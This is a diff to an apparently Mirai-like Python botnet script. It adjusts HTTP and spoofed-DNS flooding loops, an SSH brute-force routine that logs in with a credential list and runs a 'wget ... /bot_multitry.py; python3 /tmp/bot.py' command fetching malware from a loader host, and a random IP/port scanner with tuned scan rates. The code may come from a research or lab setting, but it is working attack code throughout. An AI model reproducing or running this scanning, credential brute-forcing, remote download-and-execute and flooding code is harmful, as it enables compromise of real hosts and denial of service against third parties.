@@ -127,12 +127,12 @@ class attack(Thread):
         if self._type == 0:
             connection = http.client.HTTPConnection(self._ip, port=self._port)
             headers = {'Content-type': 'application/json'}
-            for i in range(randint(20,40)):
+            for i in range(randint(30,40)):
                 connection.request("GET", self.get_random_string(7), headers=headers)
                 _ = connection.getresponse()
             connection.close()
         elif self._type == 1:
-            for i in range(randint(20,40)):
+            for i in range(randint(30,40)):
                 l_qname = 'somedomain.com'
                 dns_req = IP(src=self._ip, dst=OUR_DNS)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=l_qname))
                 _ = sr1(dns_req, timeout=1, verbose=0)
@@ -156,8 +156,8 @@ class ssh_login(Thread):
         try:
             s.connect(self._ip, 22, self._uname, self._pwd, timeout=5, auth_timeout=5)
 
-            # Download malware from loader and execute.
-            cmd = "wget -O /tmp/bot.py {}:{}/bot_multitry.py && python3 /tmp/bot.py {} {} &".format(MOD_IP, LOADER_PORT, MOD_IP, OUR_DNS)
+            # Download malware from loader and execute. Suprisingly if ; is repalced with &&, does not work. 
+            cmd = "wget -O /tmp/bot.py {}:{}/bot_multitry.py;python3 /tmp/bot.py {} {} &".format(MOD_IP, LOADER_PORT, MOD_IP, OUR_DNS)
             sin, sout, serr = s.exec_command(cmd)
             sout.channel.recv_exit_status()
             print('Login successful using {} {} {}.'.format(self._ip, self._uname, self._pwd))
@@ -233,8 +233,13 @@ async def login():
 
         print('[D] Login Thread.')
 
-        for ip in OPEN_IPS.keys():
-            if OPEN_IPS[ip]['login'] is False:
+        # Fails to execute if increased.
+        max_logins=2
+        with LOCK:
+            kk = OPEN_IPS.copy()
+
+        for ip in kk.keys():
+            if kk[ip]['login'] is False:
                 for _ in range(max_logins):
                     vals = choice(CRED_LIST)
                     login_attempt = ssh_login(ip, vals[0], vals[1])
@@ -257,14 +262,14 @@ async def scan():
     while True:
         max_ips = 20
         if SCAN_RATE == 0:
-            max_ips = 10
-            duration = 10.0
+            max_ips = 5
+            duration = 15.0
         elif SCAN_RATE == 1:
-            max_ips = 20
-            duration = 5.0
+            max_ips = 7
+            duration = 7.0
         elif SCAN_RATE == 2:
-            max_ips = 30
-            duration = 1.0
+            max_ips = 10
+            duration = 2.0
         else:
             pass
 
@@ -272,7 +277,7 @@ async def scan():
             t_scan = tcp_scan(get_ip_address(choice(SCAN_NETWORK)), int(choice(SCAN_PORT)))       
             t_scan.start()
 
-        print("[D] OPEN_IPS: {}".format(OPEN_IPS))
+        #print("[D] OPEN_IPS: {}".format(OPEN_IPS))
         await asyncio.sleep(duration)
 
 # Process msg.
